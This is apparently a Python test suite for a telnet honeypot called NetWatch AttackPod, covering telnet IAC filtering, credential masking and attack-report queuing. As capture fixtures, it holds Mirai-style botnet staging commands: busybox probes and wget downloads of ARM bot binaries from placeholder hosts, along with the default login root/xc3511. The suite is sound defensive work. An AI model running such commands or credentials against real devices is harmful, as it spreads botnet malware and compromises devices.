"""
Additional tests for NetWatch Telnet AttackPod functions
"""

import os
import sys
import unittest
from unittest.mock import MagicMock, patch

# Add the src directory to path so we can import monitor
sys.path.insert(0, os.path.dirname(__file__))


class TestMonitorAdvancedFunctions(unittest.TestCase):
    def setUp(self):
        """Set up test fixtures before each test method."""
        # Clear any test environment variables
        test_vars = [
            "TEST_VAR",
            "NETWATCH_TEST_MODE",
            "NETWATCH_COLLECTOR_URL",
            "COLLECTOR_REQUEST_TIMEOUT",
            "CHECK_IP_TIMEOUT",
        ]
        for var in test_vars:
            if var in os.environ:
                del os.environ[var]

    def tearDown(self):
        """Clean up after each test method."""
        # Ensure clean state after tests
        self.setUp()

    @patch("monitor.requests.get")
    def test_get_local_ip_success(self, mock_get):
        """Test successful IP detection"""
        # Mock the response from the NetWatch API
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.json.return_value = {"ip": "203.0.113.42"}
        mock_get.return_value = mock_response

        # Import after setting environment
        from monitor import get_local_ip

        # Test with default URL (should use the mocked response)
        ip = get_local_ip()
        self.assertEqual(ip, "203.0.113.42")

    @patch("monitor.time.sleep")
    @patch("monitor.requests.get")
    def test_get_local_ip_failure(self, mock_get, mock_sleep):
        """Test IP detection failure handling"""
        # Mock a failed response from the API
        mock_response = MagicMock()
        mock_response.status_code = 500
        mock_get.return_value = mock_response

        # Import after setting environment
        from monitor import get_local_ip

        # Mock sys.exit to avoid actual program termination during testing
        with patch("monitor.sys.exit") as mock_exit:
            mock_exit.side_effect = SystemExit(1)
            # This should call sys.exit when all retries are exhausted
            with self.assertRaises(SystemExit):
                get_local_ip(max_retries=2, retry_delay=0)
            mock_exit.assert_called_once_with(1)

    def test_handle_client_releases_semaphore(self):
        """Test that handle_client always releases the semaphore"""
        import threading

        from monitor import handle_client

        sem = threading.BoundedSemaphore(1)
        self.assertTrue(sem.acquire(blocking=False))

        mock_socket = MagicMock()
        mock_socket.recv.return_value = b""

        handle_client(mock_socket, "1.2.3.4", semaphore=sem)
        # Verify semaphore was released back
        self.assertTrue(sem.acquire(blocking=False))

    def test_filter_telnet_iac(self):
        """Test RFC 854 IAC filtering logic"""
        from monitor import filter_telnet_iac

        # Test basic text without commands
        clean, rem = filter_telnet_iac(b"admin\r\n")
        self.assertEqual(clean, bytearray(b"admin\r\n"))
        self.assertEqual(rem, b"")

        # Test 3-byte WILL / WONT command stripping
        clean, rem = filter_telnet_iac(b"\xff\xfb\x01user\r\n")
        self.assertEqual(clean, bytearray(b"user\r\n"))
        self.assertEqual(rem, b"")

        # Test escaped IAC (0xFF 0xFF -> 0xFF)
        clean, rem = filter_telnet_iac(b"\xff\xff")
        self.assertEqual(clean, bytearray(b"\xff"))
        self.assertEqual(rem, b"")

        # Test subnegotiation stripping (IAC SB ... IAC SE)
        clean, rem = filter_telnet_iac(b"\xff\xfa\x18\x00VT100\xff\xf0pass\r\n")
        self.assertEqual(clean, bytearray(b"pass\r\n"))
        self.assertEqual(rem, b"")

        # Test trailing incomplete IAC byte
        clean, rem = filter_telnet_iac(b"abc\xff")
        self.assertEqual(clean, bytearray(b"abc"))
        self.assertEqual(rem, b"\xff")

    def test_telnet_read_filtered_input_buffering_and_caps(self):
        """Test buffered line reading and max length capping"""
        from monitor import telnet_read_filtered_input

        mock_socket = MagicMock()
        # Simulate fragmented chunk delivery across two packets
        mock_socket.recv.side_effect = [b"root", b"admin\r\n"]
        result = telnet_read_filtered_input(mock_socket, max_length=50)
        self.assertEqual(result, "rootadmin")

        # Test length capping
        mock_socket.recv.side_effect = [b"A" * 100 + b"\r\n"]
        result = telnet_read_filtered_input(mock_socket, max_length=10)
        self.assertEqual(len(result), 10)
        self.assertEqual(result, "A" * 10)

    def test_mask_sensitive_value(self):
        """Test sensitive value masking utility"""
        from monitor import mask_sensitive_value

        self.assertEqual(mask_sensitive_value(""), "(empty)")
        self.assertEqual(mask_sensitive_value("a"), "***")
        self.assertEqual(mask_sensitive_value("ab"), "***")
        self.assertEqual(mask_sensitive_value("abc"), "a*c")
        self.assertEqual(mask_sensitive_value("password123"), "p*********3")

    def test_attack_queue_bounded_drop(self):
        """Test that attack_queue is bounded and drops excess attacks without crashing"""
        import queue

        from monitor import MAX_QUEUE_SIZE, attack_queue, submit_attack

        self.assertGreater(attack_queue.maxsize, 0)

        # Test full queue handling with a small test queue
        test_q = queue.Queue(maxsize=1)
        with patch("monitor.attack_queue", test_q):
            # First put succeeds
            submit_attack("8.8.8.8", "user1", "pass1", "ev1", "1.2.3.4", 1234)
            self.assertEqual(test_q.qsize(), 1)
            # Second put on full queue drops cleanly with warning instead of blocking or crashing
            submit_attack("8.8.8.8", "user2", "pass2", "ev2", "1.2.3.4", 1235)
            self.assertEqual(test_q.qsize(), 1)

    def test_validate_configuration_warnings(self):
        """Test validate_configuration detects missing credentials"""
        from monitor import validate_configuration

        with patch("monitor.logging.warning") as mock_warn:
            # Without auth configured, warning should be logged
            validate_configuration()
            self.assertTrue(mock_warn.called)

    def test_handle_shutdown_signal(self):
        """Test that handle_shutdown_signal sets shutdown_event"""
        import signal

        from monitor import handle_shutdown_signal, shutdown_event

        shutdown_event.clear()
        self.assertFalse(shutdown_event.is_set())
        handle_shutdown_signal(signal.SIGTERM, None)
        self.assertTrue(shutdown_event.is_set())
        shutdown_event.clear()

    def test_filter_telnet_iac_with_telemetry(self):
        """Test extraction of IAC option sequence, terminal type, and env variables into telemetry."""
        from monitor import filter_telnet_iac

        telemetry = {}
        # Client sends DO:1, DO:3, WILL:24, and TTYPE VT100
        data = (
            b"\xff\xfd\x01"  # IAC DO 1
            b"\xff\xfd\x03"  # IAC DO 3
            b"\xff\xfb\x18"  # IAC WILL 24
            b"\xff\xfa\x18\x00xterm-256color\xff\xf0"  # IAC SB 24 0 xterm-256color IAC SE
            b"\xff\xfa\x27\x00USER\x01root\xff\xf0"  # IAC SB 39 (NEW-ENVIRON) USER=root IAC SE
            b"admin\r\n"
        )
        clean, rem = filter_telnet_iac(data, telemetry=telemetry)
        self.assertEqual(clean, bytearray(b"admin\r\n"))
        self.assertEqual(rem, b"")
        self.assertEqual(telemetry["iac_options"], ["DO:1", "DO:3", "WILL:24"])
        self.assertEqual(telemetry["ttype"], "xterm-256color")
        self.assertEqual(telemetry["env"], {"USER": "root"})

    def test_submit_attack_with_enriched_telemetry(self):
        """Test submit_attack populates metadata with IAC and command capture fields."""
        from monitor import attack_queue, submit_attack

        while not attack_queue.empty():
            attack_queue.get_nowait()

        submit_attack(
            ip="198.51.100.99",
            user="root",
            password="adminpassword",
            evidence="Telnet attack evidence",
            ATTACKPOD_LOCAL_IP="203.0.113.1",
            source_port=44556,
            telnet_iac="DO:1,DO:3,WILL:31",
            telnet_iac_fingerprint="c4ca4238a0b923820dcc509a6f75849b",
            telnet_ttype="vt100",
            telnet_env={"USER": "root"},
            initial_command="enable; system; shell; sh; /bin/busybox ECCHI; wget http://1.2.3.4/bins/mirai.arm7",
            busybox_token="ECCHI",
            payload_url="http://1.2.3.4/bins/mirai.arm7",
        )

        self.assertEqual(attack_queue.qsize(), 1)
        item = attack_queue.get_nowait()
        meta = item["metadata"]
        self.assertEqual(meta["username"], "root")
        self.assertEqual(meta["password"], "adminpassword")
        self.assertEqual(meta["source_port"], 44556)
        self.assertEqual(meta["telnet_iac"], "DO:1,DO:3,WILL:31")
        self.assertEqual(meta["telnet_iac_fingerprint"], "c4ca4238a0b923820dcc509a6f75849b")
        self.assertEqual(meta["telnet_ttype"], "vt100")
        self.assertEqual(meta["telnet_env"], {"USER": "root"})
        self.assertEqual(meta["busybox_token"], "ECCHI")
        self.assertEqual(meta["payload_url"], "http://1.2.3.4/bins/mirai.arm7")

    @patch("monitor.submit_attack")
    def test_handle_client_mirai_command_capture(self, mock_submit):
        """Test handle_client captures Mirai bot staging command sequence."""
        from monitor import handle_client

        mock_socket = MagicMock()
        mock_socket.getpeername.return_value = ("198.51.100.44", 51234)
        mock_socket.recv.side_effect = [
            b"root\r\n",  # username
            b"xc3511\r\n",  # password
            b"enable\r\n",  # preamble 1
            b"system\r\n",  # preamble 2
            b"sh\r\n",  # preamble 3
            b"/bin/busybox MIRAI; wget http://198.51.100.5/bins/bot.arm -O - > /tmp/b\r\n",  # command
        ]

        handle_client(mock_socket, "203.0.113.1")
        self.assertTrue(mock_submit.called)
        call_kwargs = mock_submit.call_args[1]
        self.assertEqual(call_kwargs["ip"], "198.51.100.44")
        self.assertEqual(call_kwargs["user"], "root")
        self.assertEqual(call_kwargs["password"], "xc3511")
        self.assertEqual(call_kwargs["busybox_token"], "MIRAI")
        self.assertEqual(call_kwargs["payload_url"], "http://198.51.100.5/bins/bot.arm")
        self.assertIn("/bin/busybox MIRAI", call_kwargs["initial_command"])


if __name__ == "__main__":
    unittest.main()
